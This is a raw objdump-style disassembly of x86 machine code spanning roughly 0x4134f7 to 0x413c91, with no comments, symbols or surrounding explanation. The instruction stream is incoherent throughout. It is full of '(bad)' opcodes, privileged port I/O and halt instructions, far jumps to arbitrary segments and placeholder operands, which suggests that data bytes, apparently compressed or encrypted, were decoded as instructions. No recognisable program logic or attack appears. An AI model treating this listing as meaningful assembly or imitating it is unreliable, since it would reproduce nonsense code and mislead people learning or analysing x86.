  4134f7:	sbb    eax,0x29edfb3b
  4134fc:	mov    eax,0xa47ecb4c
  413501:	cmp    ebx,esi
  413503:	xchg   edx,eax
  413504:	sbb    ch,BYTE PTR [edx-0x69]
  413507:	jb     0x4134db
  413509:	mov    esi,DWORD PTR [eax+0x53]
  41350c:	and    BYTE PTR [esi+0x65],bh
  41350f:	fisttp WORD PTR [edx+0x37a79cf9]
  413515:	add    eax,0x517b7cc
  41351a:	loope  0x4134a8
  41351c:	push   es
  41351d:	bound  edx,QWORD PTR [ebx-0x21]
  413520:	sbb    al,0x43
  413522:	sub    eax,0xa28cbf17
  413527:	jmp    0xe3b9:0x5498bf8b
  41352e:	dec    ebx
  41352f:	das    
  413530:	inc    esp
  413531:	bound  esi,QWORD PTR [ebp+ebx*2-0x6d61d313]
  413538:	pop    ds
  413539:	jae    0x413552
  41353b:	or     eax,0x1f20be4
  413540:	(bad)  
  413542:	mov    esp,0x23e7fda6
  413547:	sbb    eax,0xa7e63689
  41354c:	pop    esp
  41354d:	ja     0x4134dc
  41354f:	stos   DWORD PTR es:[edi],eax
  413550:	fld    st(3)
  413552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413553:	fsubr  QWORD PTR [ecx]
  413555:	sub    esi,ecx
  413557:	mov    dh,0x5e
  413559:	iret   
  41355a:	fstp   QWORD PTR [esi+ebx*2-0x49]
  41355e:	or     cl,BYTE PTR [edi-0x5f]
  413561:	push   ds
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	mov    al,ds:0xa54cb75c
  413568:	mov    bh,0x6b
  41356a:	lds    ecx,FWORD PTR [ecx+0x35b4cca6]
  413570:	call   0xe05:0x3ea32068
  413577:	jle    0x41359c
  413579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41357a:	test   DWORD PTR [ecx-0x7ec416e5],edi
  413580:	pop    edi
  413581:	or     eax,0xe654c833
  413586:	fisubr WORD PTR [eax]
  413588:	aaa    
  413589:	xor    DWORD PTR [ebp-0x3e],edi
  41358c:	in     al,0x17
  41358e:	cmp    BYTE PTR [esi+0x60327835],al
  413594:	ficom  DWORD PTR [ecx-0x4d]
  413597:	outs   dx,BYTE PTR ds:[esi]
  413598:	adc    esi,DWORD PTR [ecx+eax*4-0x118e7a1]
  41359f:	pop    ecx
  4135a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135a1:	pop    ebp
  4135a2:	outs   dx,BYTE PTR es:[esi]
  4135a4:	and    al,0xd
  4135a6:	dec    esi
  4135a7:	fwait
  4135a8:	pop    esp
  4135a9:	mov    ebx,0x6b4f63ad
  4135ae:	sti    
  4135af:	or     al,0xc9
  4135b1:	dec    edi
  4135b2:	add    dh,BYTE PTR ds:0x6c8b4bda
  4135b8:	and    ebp,0xb77306ec
  4135be:	pop    ebp
  4135bf:	stos   BYTE PTR es:[edi],al
  4135c0:	adc    ebx,DWORD PTR [ecx]
  4135c2:	ins    DWORD PTR es:[edi],dx
  4135c3:	jae    0x413593
  4135c5:	cdq    
  4135c6:	(bad)  
  4135c7:	xchg   ebx,eax
  4135c8:	popa   
  4135c9:	fstp   QWORD PTR [eax+0x20559f06]
  4135cf:	xor    BYTE PTR [esi+ebp*4+0x5a],al
  4135d3:	mov    ds:0x97bdf9e9,al
  4135d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135d9:	jnp    0x413587
  4135db:	rcl    ebp,cl
  4135dd:	iret   
  4135de:	ins    DWORD PTR es:[edi],dx
  4135df:	mov    ecx,0x456ff1c0
  4135e4:	js     0x41357e
  4135e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135e7:	fmul   QWORD PTR [edx]
  4135e9:	mov    bl,0xa9
  4135eb:	sbb    al,al
  4135ed:	cmp    esi,DWORD PTR [esi+eiz*4-0x48]
  4135f1:	fild   WORD PTR [edx+0x4f]
  4135f4:	adc    bl,BYTE PTR [edi-0x50]
  4135f7:	arpl   WORD PTR [edi+0x7a],ax
  4135fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135fb:	sub    eax,0x61f959cf
  413600:	mov    ebx,0x2af29844
  413605:	adc    ebp,DWORD PTR [ebx-0xe]
  413608:	push   ebp
  413609:	mov    ds:0xe483c8d8,al
  41360e:	jp     0x413677
  413610:	adc    al,0xed
  413612:	stos   DWORD PTR es:[edi],eax
  413613:	out    dx,eax
  413614:	fstp   QWORD PTR [edx-0x18]
  413617:	mov    bl,0x86
  413619:	jl     0x413639
  41361b:	adc    al,0x43
  41361d:	xor    bl,BYTE PTR [ebx+0x7d468339]
  413623:	fnsave [edi+0x6d507760]
  413629:	retf   
  41362a:	(bad)  
  41362b:	std    
  41362c:	test   dh,bl
  41362e:	push   esp
  41362f:	stc    
  413630:	xchg   edx,eax
  413631:	shl    BYTE PTR [edi],cl
  413633:	call   0x1cf7e650
  413638:	jmp    0xa8d5b2b5
  41363d:	inc    edx
  41363e:	push   ss
  41363f:	not    DWORD PTR [esi-0x80]
  413642:	out    dx,eax
  413643:	push   ebp
  413644:	pusha  
  413645:	je     0x413614
  413647:	inc    edx
  413648:	int3   
  413649:	mov    bh,0xb1
  41364b:	xor    al,0x93
  41364d:	jle    0x413637
  41364f:	sub    eax,DWORD PTR [ecx*8+0x4d929b33]
  413656:	pop    edi
  413657:	mul    dl
  413659:	mov    ebp,0x85e83e12
  41365e:	pusha  
  41365f:	or     DWORD PTR [eax],eax
  413661:	push   ebp
  413662:	mov    ch,0xd
  413664:	pop    es
  413665:	and    ch,BYTE PTR [ebx-0x68]
  413668:	push   cs
  413669:	(bad)  
  41366b:	(bad)  
  41366c:	jmp    0x55d0bd0a
  413671:	pusha  
  413672:	sub    eax,DWORD PTR [esi-0x4e]
  413675:	or     eax,0xc5323a20
  41367a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41367c:	scas   al,BYTE PTR es:[edi]
  41367d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41367e:	fsub   DWORD PTR [ecx-0x27b33edf]
  413685:	cmp    al,0x14
  413687:	add    ebx,DWORD PTR [esi*2+0x4f2b18c9]
  41368e:	pop    esi
  41368f:	ret    0x2a8c
  413692:	sub    BYTE PTR [esi-0x25],dl
  413695:	mov    es,WORD PTR [edi]
  413697:	(bad)  [ebx+ecx*2]
  41369a:	dec    esp
  41369b:	shl    BYTE PTR [esp+ecx*8-0x633b17a7],0xca
  4136a3:	jecxz  0x41364b
  4136a5:	dec    edx
  4136a6:	xchg   edx,eax
  4136a7:	jnp    0x4136bc
  4136a9:	fdiv   QWORD PTR [esi-0x65]
  4136ac:	xchg   BYTE PTR [eax+0x64],bh
  4136af:	adc    DWORD PTR [edi],edx
  4136b1:	into   
  4136b2:	dec    ecx
  4136b3:	sbb    BYTE PTR [edi+0x2909d773],ch
  4136b9:	fbld   TBYTE PTR [ecx+0x5e13791c]
  4136bf:	add    DWORD PTR [eax],0xf1d4669
  4136c5:	pop    edx
  4136c6:	xchg   edx,eax
  4136c7:	(bad)  
  4136c8:	pusha  
  4136c9:	jno    0x4136b2
  4136cb:	fdiv   QWORD PTR [esi+0x59d04475]
  4136d1:	js     0x413720
  4136d3:	(bad)  
  4136d4:	sar    edx,1
  4136d6:	inc    ecx
  4136d7:	fdivr  DWORD PTR [ebx-0x5f69ac76]
  4136dd:	mov    al,0x8f
  4136df:	retf   0xc1a1
  4136e2:	push   ebx
  4136e4:	xor    eax,0x8312e984
  4136e9:	xchg   edx,eax
  4136ea:	sbb    al,0xab
  4136ec:	call   FWORD PTR [ebx]
  4136ee:	xchg   edx,eax
  4136ef:	imul   edx,eax,0xf693c017
  4136f5:	(bad)  
  4136f6:	push   es
  4136f7:	stos   DWORD PTR es:[edi],eax
  4136f8:	pop    edi
  4136f9:	enter  0x730b,0x3f
  4136fd:	inc    ebp
  4136fe:	or     ah,ah
  413700:	inc    esi
  413701:	popf   
  413702:	mov    ch,BYTE PTR [edi]
  413704:	adc    BYTE PTR [edx+eiz*8+0x39],0x6e
  413709:	pop    ecx
  41370a:	xchg   ebx,eax
  41370b:	adc    eax,esp
  41370d:	fiadd  DWORD PTR [ebp-0x7528d168]
  413713:	sbb    DWORD PTR [ebp+ebx*1+0x6],ecx
  413717:	xchg   edi,eax
  413718:	mov    al,0x87
  41371a:	push   esi
  41371b:	xlat   BYTE PTR fs:[ebx]
  41371d:	pop    edi
  41371e:	or     ebx,DWORD PTR [ebx]
  413720:	call   0x9e934fbc
  413725:	loope  0x4136ed
  413727:	enter  0xa6ba,0x5d
  41372b:	pop    esp
  41372c:	mov    edx,ebp
  41372e:	pop    ebp
  41372f:	adc    eax,0xca7fc848
  413734:	ins    DWORD PTR es:[edi],dx
  413735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413736:	jecxz  0x4136d4
  413738:	rol    esi,cl
  41373a:	sub    ch,BYTE PTR [ebx-0x6f239b51]
  413740:	fidivr WORD PTR [ecx-0x69]
  413743:	fidiv  WORD PTR [edi]
  413745:	sub    al,0xdc
  413747:	pop    ecx
  413748:	push   eax
  413749:	jnp    0x413708
  41374b:	push   esi
  41374c:	mov    dh,0xa
  41374e:	inc    esp
  41374f:	sub    ch,BYTE PTR [esi]
  413751:	pop    edx
  413752:	outs   dx,BYTE PTR ds:[esi]
  413753:	popa   
  413754:	inc    ebx
  413755:	push   ebp
  413756:	retf   
  413757:	ja     0x4137aa
  413759:	test   al,0x33
  41375b:	out    dx,eax
  41375c:	pop    ss
  41375d:	dec    esp
  41375e:	loope  0x41370a
  413760:	pop    esp
  413761:	xchg   ebp,eax
  413762:	pop    es
  413763:	mov    al,ds:0x34b4b191
  413768:	mov    DWORD PTR [eax-0x69],0x51c06232
  41376f:	and    al,0xc4
  413771:	cmp    DWORD PTR [eax],0xffffffb4
  413774:	mov    esi,0x5df97398
  413779:	adc    al,0x1a
  41377b:	aaa    
  41377c:	push   0xffffffd6
  41377e:	cmp    al,0x82
  413780:	mov    dh,0x62
  413782:	mov    esp,0x7bba84a3
  413787:	lea    edi,[edi-0x57]
  41378a:	jne    0x413722
  41378c:	adc    ch,BYTE PTR [ecx-0x8]
  41378f:	fstp   DWORD PTR [ebx+0x68]
  413792:	and    eax,0x4b6cadd3
  413797:	pop    ecx
  413798:	nop
  413799:	add    edx,eax
  41379b:	pop    ds
  41379c:	lods   al,BYTE PTR ds:[esi]
  41379d:	xchg   edi,eax
  41379e:	in     eax,0x61
  4137a0:	and    BYTE PTR [ebx+0x51b8aad],dh
  4137a6:	add    esi,esi
  4137a8:	ds inc esp
  4137aa:	lea    edi,ds:0x865719ed
  4137b0:	jecxz  0x41374c
  4137b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137b3:	xchg   ebp,eax
  4137b4:	ret    
  4137b5:	dec    esi
  4137b6:	or     eax,0x85c1ec5
  4137bb:	hlt    
  4137bc:	inc    eax
  4137bd:	pop    eax
  4137be:	add    BYTE PTR [ecx+0x3e06c81f],cl
  4137c4:	les    ebx,FWORD PTR [edi+0x33293763]
  4137ca:	mov    ch,0x6b
  4137cc:	jmp    0x413774
  4137ce:	js     0x41378e
  4137d0:	pop    ebp
  4137d1:	stos   DWORD PTR es:[edi],eax
  4137d2:	push   0x4c5f59d8
  4137d7:	dec    esi
  4137d8:	out    dx,eax
  4137d9:	loop   0x413813
  4137db:	jno    0x41377e
  4137dd:	test   BYTE PTR [edi+eiz*8],0xcc
  4137e1:	test   BYTE PTR [ecx+edx*1],bl
  4137e4:	std    
  4137e5:	inc    edi
  4137e6:	push   0xf288aa95
  4137eb:	test   BYTE PTR [edx+0x21],dh
  4137ee:	xchg   edx,eax
  4137ef:	fistp  QWORD PTR [ecx-0x550d81a9]
  4137f5:	add    al,BYTE PTR ds:0xee2549f3
  4137fb:	fistp  DWORD PTR [edi-0x3f]
  4137fe:	cmp    al,0x48
  413800:	jmp    0x413869
  413802:	out    dx,al
  413803:	out    0x81,eax
  413805:	inc    edx
  413806:	adc    bh,BYTE PTR [ebx+esi*2+0x33a0f2d9]
  41380d:	xchg   BYTE PTR [eax-0x15],cl
  413810:	pop    es
  413811:	inc    edx
  413812:	jo     0x41379f
  413814:	fs pop ebp
  413816:	sub    ah,BYTE PTR [edx]
  413818:	push   edx
  413819:	stos   BYTE PTR es:[edi],al
  41381a:	jl     0x41382c
  41381c:	sub    eax,0x60fda515
  413821:	xchg   ebx,eax
  413822:	je     0x41389b
  413824:	fidivr DWORD PTR [eax+0x71120e24]
  41382a:	les    ecx,FWORD PTR [ebx-0x2c46b841]
  413830:	mov    dl,0x78
  413832:	fwait
  413833:	je     0x4138a6
  413835:	(bad)  
  413836:	jmp    0xb5916e09
  41383b:	imul   ebx,ebx,0x6f
  41383e:	cmp    ebx,DWORD PTR ds:0x7d004780
  413844:	fcom   st(6)
  413846:	or     ebx,DWORD PTR [esi+0x2dd9065f]
  41384c:	or     eax,0x3844e02d
  413851:	int3   
  413852:	or     edi,DWORD PTR [esi]
  413854:	xchg   ebx,eax
  413855:	jecxz  0x413875
  413857:	push   edx
  413858:	out    dx,al
  413859:	sbb    ecx,DWORD PTR [ebx+0x41]
  41385c:	xor    BYTE PTR [edx-0x1d1afa53],bh
  413862:	shr    BYTE PTR [ebx],1
  413864:	cmp    ebx,DWORD PTR [edi+0x10562f35]
  41386a:	(bad)  [eax+0x38]
  41386d:	mov    ch,0xab
  41386f:	sti    
  413870:	call   0x8faddb3d
  413875:	inc    eax
  413876:	jmp    0xd1e2:0x57b7d9d6
  41387d:	int3   
  41387e:	push   es
  41387f:	inc    ecx
  413880:	xchg   DWORD PTR [eax+ecx*8],ebx
  413883:	addr16 (bad) 
  413885:	mov    bl,0xca
  413887:	adc    ebp,edx
  413889:	in     al,dx
  41388a:	mov    ecx,0x961f6818
  41388f:	iret   
  413890:	(bad)  
  413891:	mov    al,ds:0x20dc696e
  413896:	pop    edi
  413897:	xchg   ecx,eax
  413898:	das    
  413899:	xor    eax,0xc2de2f06
  41389e:	icebp  
  41389f:	sub    eax,0x6eeb48f2
  4138a4:	(bad)  
  4138a5:	xchg   ebp,eax
  4138a6:	in     al,dx
  4138a7:	pop    edi
  4138a8:	jg     0x413910
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ac:	repnz cli 
  4138ae:	sub    DWORD PTR [edi+0x7a49ca99],ebp
  4138b4:	lds    edi,FWORD PTR [edi+edi*2]
  4138b7:	add    DWORD PTR [ebx+edx*4-0x416a8081],esi
  4138be:	mov    bh,0x7e
  4138c0:	hlt    
  4138c1:	cmp    BYTE PTR [edi*2+0x46280b4e],ch
  4138c8:	div    DWORD PTR es:[eax-0x32bfcbe1]
  4138cf:	jmp    0xa7b47a9d
  4138d4:	aas    
  4138d5:	loop   0x4138bd
  4138d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138d8:	lea    edx,[esi]
  4138da:	pushf  
  4138db:	inc    edi
  4138dc:	lods   eax,DWORD PTR ds:[esi]
  4138dd:	fs xchg ebp,eax
  4138df:	sbb    eax,0x4633040d
  4138e4:	mov    ah,0xa3
  4138e6:	loopne 0x413890
  4138e8:	rcl    BYTE PTR [esi],1
  4138ea:	in     al,dx
  4138eb:	out    0xce,al
  4138ed:	fadd   st(0),st
  4138ef:	int3   
  4138f0:	loop   0x41387f
  4138f2:	jmp    0x413884
  4138f4:	fucom  st(1)
  4138f6:	clc    
  4138f7:	cmp    esi,ebx
  4138f9:	call   0x5f05:0x95711359
  413900:	adc    eax,0xaeb046e3
  413905:	cmc    
  413906:	or     DWORD PTR [esi],ecx
  413908:	leave  
  413909:	add    eax,0x597234a0
  41390e:	pop    ecx
  41390f:	xchg   edi,eax
  413910:	rcl    bh,0x9b
  413913:	jl     0x4138b0
  413915:	sub    dh,BYTE PTR [ebx-0x31]
  413918:	push   0xd6b49cb1
  41391d:	inc    ebp
  41391e:	pop    ebp
  41391f:	ret    
  413920:	fmul   QWORD PTR [ebx+ecx*4+0x63]
  413924:	das    
  413925:	push   ds
  413926:	xor    eax,0xf619df6c
  41392b:	jae    0x4139a8
  41392d:	rcr    bh,1
  41392f:	test   DWORD PTR es:[edi+0x21],0x150fa01b
  413937:	add    edx,DWORD PTR [ecx+0x69013ec3]
  41393d:	push   ss
  41393e:	mov    al,0x4
  413940:	jl     0x4138ed
  413942:	repnz repz scas al,BYTE PTR es:[edi]
  413945:	sbb    edx,ecx
  413947:	and    BYTE PTR [ebp-0x60],0xe
  41394b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41394c:	push   eax
  41394d:	shl    DWORD PTR [edx-0x27],0x55
  413951:	cmp    eax,0x7c228b2f
  413956:	jns    0x413929
  413958:	loopne 0x413956
  41395a:	dec    eax
  41395b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41395c:	iret   
  41395d:	dec    edi
  41395e:	addr16 retf 0x1251
  413962:	out    0x83,al
  413964:	(bad)  
  413965:	fucom  st(5)
  413967:	jge    0x413920
  413969:	pop    edi
  41396a:	inc    esp
  41396b:	push   cs
  41396c:	sub    al,BYTE PTR [esi+0x218c9057]
  413972:	pop    ebp
  413973:	icebp  
  413974:	xor    eax,0xc02353cf
  413979:	inc    ecx
  41397a:	dec    esi
  41397b:	add    eax,0x5be81622
  413980:	cdq    
  413981:	inc    edi
  413982:	jmp    0x5551:0x178a04c6
  413989:	imul   ebx,DWORD PTR [esi-0x4f125bc0],0xffffffba
  413990:	add    al,0x24
  413992:	mov    bl,0x22
  413994:	icebp  
  413995:	int    0x94
  413997:	(bad)  [esi+0x35e68a01]
  41399d:	or     DWORD PTR [ecx-0x74],0xe433de60
  4139a4:	data16 sahf 
  4139a6:	cmp    dl,BYTE PTR [ebx]
  4139a8:	add    dl,BYTE PTR [eax-0x17bdfff7]
  4139ae:	xchg   ecx,eax
  4139af:	lods   eax,DWORD PTR ds:[esi]
  4139b0:	jno    0x4139d3
  4139b2:	cmp    BYTE PTR [eax-0x60],bh
  4139b5:	data16 mov bh,0x74
  4139b8:	test   BYTE PTR [edx-0x3012b1a3],dh
  4139be:	dec    esi
  4139bf:	add    eax,0xe16e1519
  4139c4:	mov    eax,ds:0xe36db45d
  4139c9:	shr    BYTE PTR [esi+0x1c53a26b],0xa8
  4139d0:	mov    al,ds:0x38af72ab
  4139d5:	add    edx,DWORD PTR [ebp+0xd054c08]
  4139db:	mov    WORD PTR [eax],es
  4139dd:	xlat   BYTE PTR ds:[ebx]
  4139de:	(bad)  
  4139e0:	mov    bh,al
  4139e2:	xchg   ah,al
  4139e4:	adc    dh,cl
  4139e6:	mov    eax,ds:0xdfe751fe
  4139eb:	jae    0x4139a7
  4139ed:	pop    es
  4139ee:	dec    esp
  4139ef:	hlt    
  4139f0:	fwait
  4139f1:	inc    esp
  4139f2:	stos   BYTE PTR es:[edi],al
  4139f3:	jae    0x413a39
  4139f5:	idiv   BYTE PTR [edx+0x42]
  4139f8:	jp     0x413a43
  4139fa:	dec    edx
  4139fb:	retf   
  4139fc:	lds    ebx,FWORD PTR [eax-0x50]
  4139ff:	fcmovnbe st,st(3)
  413a01:	adc    eax,0xbcbef893
  413a06:	rcl    BYTE PTR [ebp+edx*1+0x4ade3f9c],0x74
  413a0e:	push   ds
  413a0f:	jmp    0xc4d18fdc
  413a14:	lods   eax,DWORD PTR ds:[esi]
  413a15:	popf   
  413a16:	arpl   WORD PTR [esi],cx
  413a18:	nop
  413a19:	mov    bl,0xd9
  413a1b:	sub    ebp,DWORD PTR [ebx]
  413a1d:	push   edx
  413a1e:	popa   
  413a1f:	loope  0x413a38
  413a21:	push   ecx
  413a22:	retf   0xe0dc
  413a25:	pop    edi
  413a26:	inc    ebx
  413a27:	in     al,dx
  413a28:	mov    BYTE PTR [ebx+0x66],cl
  413a2b:	scas   eax,DWORD PTR es:[edi]
  413a2c:	bound  ax,DWORD PTR ds:0xf38d198
  413a33:	add    al,0xd4
  413a35:	xchg   ebp,eax
  413a36:	mov    bl,0x6d
  413a38:	push   esp
  413a39:	retf   0xbfc
  413a3c:	lock mov eax,0x513d2028
  413a42:	mov    edx,0xb505716c
  413a47:	pop    esi
  413a48:	cwde   
  413a49:	xor    DWORD PTR [ebx+ecx*1],ebx
  413a4c:	push   ss
  413a4d:	ret    0x4aa8
  413a50:	jg     0x413ad1
  413a52:	ins    BYTE PTR es:[edi],dx
  413a53:	and    al,0xfe
  413a55:	fnsetpm(287 only) 
  413a57:	sub    eax,0x2686a133
  413a5c:	mov    ?,esi
  413a5e:	xor    al,0x35
  413a60:	rcr    bh,1
  413a62:	push   ecx
  413a63:	out    dx,al
  413a64:	jge    0x4139ff
  413a66:	sub    eax,edi
  413a68:	add    eax,0x91b73007
  413a6d:	loope  0x413a9b
  413a6f:	fs jnp 0x413ad2
  413a72:	xchg   ebp,eax
  413a73:	mov    edx,0xd3ffc0d1
  413a78:	shl    DWORD PTR [edx-0x61],cl
  413a7b:	retf   
  413a7c:	fild   WORD PTR [esi]
  413a7e:	add    al,0x61
  413a80:	inc    ebx
  413a81:	jno    0x413ae1
  413a83:	cmp    DWORD PTR [esi+0x63],edi
  413a86:	rcl    DWORD PTR [esi],1
  413a88:	fidiv  WORD PTR [ebx+0x7d]
  413a8b:	ins    DWORD PTR es:[edi],dx
  413a8c:	mov    dl,0x45
  413a8e:	add    BYTE PTR [edi],bl
  413a90:	cdq    
  413a91:	scas   al,BYTE PTR es:[edi]
  413a92:	retf   
  413a93:	ror    DWORD PTR [eax+0x21605e1e],0x50
  413a9a:	shl    ah,cl
  413a9c:	xchg   ecx,eax
  413a9d:	and    ah,bl
  413a9f:	call   0x2a4dcd61
  413aa4:	mul    BYTE PTR [edx+0x4b]
  413aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aa8:	xchg   esi,eax
  413aa9:	pop    es
  413aaa:	loop   0x413b22
  413aac:	stc    
  413aad:	mov    DWORD PTR [esi+0x5],ecx
  413ab0:	mov    eax,ebp
  413ab2:	cmp    eax,0xfb4ec104
  413ab7:	lea    ebp,[edi+eiz*2-0x5cc08914]
  413abe:	fld    QWORD PTR [ecx]
  413ac0:	dec    ecx
  413ac1:	push   0x77f6cd3b
  413ac6:	cmp    ebx,eax
  413ac8:	cwde   
  413ac9:	mov    cl,BYTE PTR [ebx+0x3b]
  413acc:	cld    
  413acd:	ret    0x5ddc
  413ad0:	jnp    0x413a61
  413ad2:	fwait
  413ad3:	arpl   WORD PTR [ecx-0x1b146b99],bx
  413ad9:	xchg   esp,eax
  413ada:	inc    esi
  413adb:	xor    BYTE PTR [edx+0x3],bh
  413ade:	adc    DWORD PTR [eax],esi
  413ae0:	pop    edi
  413ae1:	cmp    eax,0xd5544385
  413ae6:	sbb    edi,DWORD PTR [eax]
  413ae8:	jae    0x413b33
  413aea:	mov    eax,0x61be4464
  413aef:	jo     0x413b48
  413af1:	das    
  413af2:	fldenv [ecx]
  413af4:	(bad)
  413af8:	pop    es
  413af9:	and    cl,BYTE PTR [eax-0x31e430a7]
  413aff:	sahf   
  413b00:	cmp    bh,cl
  413b02:	leave  
  413b03:	data16 mov BYTE PTR [esi-0x6b],ch
  413b07:	popa   
  413b08:	xchg   ebx,eax
  413b09:	data16 arpl WORD PTR [eax+ecx*2-0x33],cx
  413b0e:	ficomp WORD PTR [esi+0x39]
  413b11:	imul   edx,DWORD PTR [edi],0xffffffec
  413b14:	nop
  413b15:	jge    0x413aa4
  413b17:	mov    bl,0x73
  413b19:	in     eax,dx
  413b1a:	and    DWORD PTR es:[ecx],0x3fd86e84
  413b21:	fsub   QWORD PTR [eax]
  413b23:	xor    al,0xf8
  413b25:	addr16 popa 
  413b27:	inc    ebx
  413b28:	or     cl,BYTE PTR [edx]
  413b2a:	cs nop
  413b2c:	stos   DWORD PTR es:[edi],eax
  413b2d:	pop    eax
  413b2e:	jo     0x413abf
  413b30:	sbb    eax,0x672f1db1
  413b35:	ror    BYTE PTR [edx-0x259b7cc5],1
  413b3b:	xchg   edi,eax
  413b3c:	and    cl,cl
  413b3e:	into   
  413b3f:	fwait
  413b40:	pop    ebp
  413b41:	push   ss
  413b42:	lahf   
  413b43:	pop    esi
  413b44:	sbb    al,BYTE PTR [ecx+0x3]
  413b47:	ins    BYTE PTR es:[edi],dx
  413b48:	sbb    al,0x59
  413b4a:	jmp    0xa5db:0x8680f838
  413b51:	hlt    
  413b52:	mov    ecx,0xf400388a
  413b57:	loop   0x413b56
  413b59:	retf   0x90fe
  413b5c:	div    bl
  413b5e:	call   0x39976be3
  413b63:	and    BYTE PTR [eax+esi*1],bh
  413b66:	push   es
  413b67:	jb     0x413b27
  413b69:	push   edx
  413b6a:	stos   BYTE PTR es:[edi],al
  413b6b:	fucomi st,st(0)
  413b6d:	xchg   ebx,esi
  413b6f:	mov    bl,al
  413b71:	retf   
  413b72:	adc    ebp,DWORD PTR [edx+0x65]
  413b75:	sub    bh,0x6f
  413b78:	outs   dx,DWORD PTR ds:[esi]
  413b79:	cs jnp 0x413bcc
  413b7c:	out    0x7b,eax
  413b7e:	cmp    al,0x92
  413b80:	xchg   edx,eax
  413b81:	ss loopne 0x413b5b
  413b84:	jo     0x413b5d
  413b86:	enter  0xf165,0x23
  413b8a:	popf   
  413b8b:	mov    cs,WORD PTR [ebx+0x2f]
  413b8e:	adc    edi,0x73
  413b91:	sbb    dl,ah
  413b93:	das    
  413b94:	mov    ch,0xbf
  413b96:	cmp    BYTE PTR [edx],bh
  413b98:	or     cl,dh
  413b9a:	je     0x413b7a
  413b9c:	fmul   DWORD PTR [edi]
  413b9e:	loop   0x413b74
  413ba0:	shl    dl,0x66
  413ba3:	or     ecx,DWORD PTR ds:0x46a5d0d2
  413ba9:	jnp    0x413bb3
  413bab:	add    al,0x68
  413bad:	sub    esi,ecx
  413baf:	lahf   
  413bb0:	mov    ds:0x9fcbdf27,al
  413bb5:	push   ds
  413bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bb7:	adc    bl,BYTE PTR [ebx+0x60]
  413bba:	push   eax
  413bbb:	dec    esi
  413bbc:	push   0xffffffdd
  413bbe:	sahf   
  413bbf:	and    DWORD PTR [ecx+ecx*2],ebp
  413bc2:	in     eax,dx
  413bc3:	inc    ecx
  413bc4:	jns    0x413ba3
  413bc6:	ins    BYTE PTR es:[edi],dx
  413bc7:	cmp    ecx,DWORD PTR [eax]
  413bc9:	push   eax
  413bca:	pop    esi
  413bcb:	push   esp
  413bcc:	stos   BYTE PTR es:[edi],al
  413bcd:	int3   
  413bce:	jo     0x413b91
  413bd0:	fadd   QWORD PTR [edi+0x21]
  413bd3:	or     DWORD PTR [esp+eax*8+0x68],edi
  413bd7:	cld    
  413bd8:	mov    dl,0x18
  413bda:	(bad)  
  413bdb:	cld    
  413bdc:	outs   dx,BYTE PTR ds:[esi]
  413bdd:	pop    edx
  413bde:	sub    al,0xa2
  413be0:	xchg   ecx,eax
  413be1:	lock sbb BYTE PTR es:[ebp-0x57],dh
  413be6:	dec    esp
  413be7:	mov    WORD PTR [ebx+0x124119c],ds
  413bed:	cld    
  413bee:	pop    eax
  413bef:	jno    0x413bf9
  413bf1:	mov    eax,ds:0x7d581a62
  413bf6:	pop    ecx
  413bf7:	push   0x42
  413bf9:	mov    bh,0x11
  413bfb:	test   bl,bl
  413bfd:	imul   eax,DWORD PTR [edi],0x31
  413c00:	bound  esi,QWORD PTR [ecx+0x79]
  413c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c04:	arpl   WORD PTR [ebx],cx
  413c06:	or     eax,0x63b9d5b9
  413c0b:	jno    0x413b92
  413c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c0e:	cmp    esi,DWORD PTR [edx-0x67d0be42]
  413c14:	in     eax,0x3f
  413c16:	jge    0x413c83
  413c18:	enter  0x2348,0xdd
  413c1c:	sub    eax,0xdfe48990
  413c21:	mov    ebp,0x277295b3
  413c26:	sbb    BYTE PTR [ecx],0xa1
  413c29:	mov    ebx,0x5dcf4892
  413c2e:	inc    esi
  413c2f:	adc    dh,BYTE PTR [edx]
  413c31:	inc    ebp
  413c32:	mov    ebx,0xa7def508
  413c37:	int    0x74
  413c39:	sub    eax,0x62a36e89
  413c3e:	repnz push 0x4f
  413c41:	sub    BYTE PTR [eax+0x184072bd],cl
  413c47:	aam    0x43
  413c49:	rcr    BYTE PTR [eax],cl
  413c4b:	inc    ebx
  413c4c:	test   al,cl
  413c4e:	add    DWORD PTR [edi],0x4a
  413c51:	cmp    DWORD PTR [edi-0x7a],ebp
  413c54:	lock or BYTE PTR [edx],bl
  413c57:	adc    al,0xfc
  413c59:	sbb    DWORD PTR [ebx+edx*4-0x2b771018],0x44
  413c61:	aad    0xcd
  413c63:	fidivr DWORD PTR [ecx]
  413c65:	lock xlat BYTE PTR ds:[ebx]
  413c67:	test   BYTE PTR [edi],dl
  413c69:	cld    
  413c6a:	mov    ebp,0xcd802a43
  413c6f:	sub    al,0x4
  413c71:	push   cs
  413c72:	je     0x413cca
  413c74:	jo     0x413c1a
  413c76:	mov    DWORD PTR ds:[edi],ebp
  413c79:	fist   DWORD PTR [edx]
  413c7b:	pop    ebp
  413c7c:	push   edx
  413c7d:	xchg   esp,eax
  413c7e:	and    edi,DWORD PTR [edi-0xe]
  413c81:	xchg   BYTE PTR [ebp-0x38a092f2],ah
  413c87:	push   eax
  413c88:	inc    ebp
  413c89:	mov    dh,0x87
  413c8b:	jnp    0x413c4a
  413c8d:	inc    edx
  413c8e:	inc    esp
  413c8f:	(bad)  
  413c90:	xchg   ecx,eax
  413c91:	push   edi
